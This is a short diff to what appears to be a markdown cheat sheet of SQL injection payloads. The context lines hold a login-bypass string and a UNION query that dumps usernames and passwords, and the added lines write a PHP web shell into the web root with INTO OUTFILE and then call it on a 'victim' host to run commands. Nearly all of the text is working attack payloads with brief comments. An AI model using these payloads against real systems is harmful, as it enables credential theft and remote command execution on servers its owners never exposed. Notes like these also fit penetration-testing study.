@@ -46,6 +46,10 @@ victor' or 1=1 LIMIT=1; --
 
 # return records from users table; put users in column 2, password in column 3 of output
 ' UNION ALL SELECT 1, username, password FROM users 
+
+# invoke PHP and echo PHP code into a file
+' UNION ALL SELECT 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/var/www/html/webshell.php'
+firefox http://victim.edu/webshell.php?cmd=whoami # navigate to and use the above LFI
 ```
 
 ## Explore
